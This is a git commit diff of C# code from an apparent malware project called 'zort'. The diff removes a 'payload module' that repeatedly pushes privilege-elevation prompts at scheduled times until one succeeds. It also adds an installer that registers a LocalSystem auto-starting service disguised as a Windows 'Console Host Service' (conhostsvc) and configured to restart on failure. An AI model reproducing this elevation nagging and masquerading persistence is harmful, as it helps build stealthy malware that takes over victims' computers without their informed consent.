b3bc2c3e65e73f687666f6c31471a0a98c00a748
Zemi <mr.hakancamcioglu@gmail.com>
2025-05-06 23:16:32 +0300

    OWO

--- ElevationHelper.cs
+++ ElevationHelper.cs
@@ -11,27 +11,8 @@ using System.Threading.Tasks;
 
 namespace zort
 {
-    public class ElevationHelper : IPayloadModule
+    public class ElevationHelper
     {
-        public const string ELEVATION_FILE_NAME = "02D873SF743.DAT";
-        private readonly Thread _elevThread = new Thread(TimedElevate);
-
-        public ElevationType ElevationType => ElevationType.NonElevated;
-        public string ModuleName => "ElevationHelper";
-        public string ModuleDescription => "Spam elevates privileges at scheduled times.";
-        public void Start()
-        {
-            _elevThread.IsBackground = true;
-            _elevThread.Start();
-        }
-
-        public void Stop()
-        {
-            if (_elevThread.IsAlive)
-            {
-                _elevThread.Abort();
-            }
-        }
 
         public static bool IsElevated()
         {
@@ -40,11 +21,6 @@ namespace zort
             var principal = new System.Security.Principal.WindowsPrincipal(
                 System.Security.Principal.WindowsIdentity.GetCurrent());
             return principal.IsInRole(adminGroup);
-        }
-
-        public static string GetElevationFilePath()
-        {
-            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ELEVATION_FILE_NAME);
         }
 
         public static void ForceElevate(string path = null)
@@ -88,68 +64,6 @@ namespace zort
             }
 
             return true;
-        }
-
-        public static void TimedElevate()
-        {
-            const bool DEBUG_DONT_WAIT = !true;
-            if (DEBUG_DONT_WAIT)
-            {
-                ModuleLogger.Log(typeof(ElevationHelper), "DEBUG: Skipping timed elevation.");
-
-                var didElevate = false;
-
-                while (!didElevate)
-                {
-                    didElevate = TryElevate();
-                    Thread.Sleep(1500);
-                }
-            }
-            else
-            {
-                var now = DateTime.Now;
-                var timesToElevate = new List<TimeSpan>
-                    {
-                        new TimeSpan(8, 25, 0),
-                        new TimeSpan(9, 15, 0),
-                        new TimeSpan(10, 5, 0),
-                        new TimeSpan(10, 55, 0),
-                        new TimeSpan(11, 45, 0),
-                        new TimeSpan(12, 35, 0),
-                        new TimeSpan(13, 05, 0),
-                        new TimeSpan(14, 15, 0),
-                        new TimeSpan(15, 5, 0)
-                    };
-
-                var nextTime = timesToElevate.FirstOrDefault(t => t > now.TimeOfDay);
-                if (nextTime == default) nextTime = timesToElevate.First();
-                var waitTime = (nextTime - now.TimeOfDay).TotalMilliseconds;
-
-                if (waitTime < 0)
-                {
-                    waitTime += TimeSpan.FromDays(1).TotalMilliseconds;
-                }
-
-                ModuleLogger.Log(typeof(ElevationHelper), $"Waiting for {waitTime / 1000 / 60:F2} mins until next elevation time: {nextTime}");
-                Thread.Sleep((int)waitTime);
-
-                var didElevate = false;
-                var timeout = nextTime.Add(new TimeSpan(0, 15, 0));
-                Random r = new Random();
-
-                while (!didElevate && DateTime.Now.TimeOfDay <= timeout)
-                {
-                    didElevate = TryElevate();
-                    if(!didElevate) Thread.Sleep(r.Next(1000, 2000));
-                }
-
-                if(didElevate)
-                {
-                    string elevationAttribPath = GetElevationFilePath();
-                    File.Create(elevationAttribPath).Close();
-                    Environment.Exit(0);
-                } 
-            }
         }
     }
 }
---
+++ ServiceInstaller.cs
@@ -0,0 +1,51 @@
+﻿using System;
+using System.ComponentModel;
+using System.Configuration.Install;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+using System.ServiceProcess;
+
+namespace zort
+{
+    [RunInstaller(true)]
+    public class ServiceInstaller : Installer
+    {
+
+        private readonly System.ServiceProcess.ServiceInstaller serviceInstaller;
+        private readonly ServiceProcessInstaller processInstaller;
+
+        public ServiceInstaller()
+        {
+            serviceInstaller = new System.ServiceProcess.ServiceInstaller();
+            processInstaller = new ServiceProcessInstaller
+            {
+                Account = ServiceAccount.LocalSystem,
+            };
+
+            serviceInstaller.StartType = ServiceStartMode.Automatic;
+            serviceInstaller.ServiceName = "conhostsvc";
+            serviceInstaller.DisplayName = "Console Host Service";
+            serviceInstaller.Description = "Provides console hosting capabilities for applications requiring background processing.";
+
+            // Configure the service to always restart on failure
+            serviceInstaller.ServicesDependedOn = new string[] { }; // Add dependencies if needed
+            serviceInstaller.AfterInstall += (sender, args) =>
+            {
+                using (var process = new Process())
+                {
+                    process.StartInfo.FileName = "sc";
+                    process.StartInfo.Arguments = $"failure \"{serviceInstaller.ServiceName}\" reset= 0 actions= restart/5000";
+                    process.StartInfo.CreateNoWindow = true;
+                    process.StartInfo.UseShellExecute = false;
+                    process.Start();
+                    process.WaitForExit();
+                }
+            };
+
+            Installers.Add(serviceInstaller);
+            Installers.Add(processInstaller);
+        }
+    }
+}
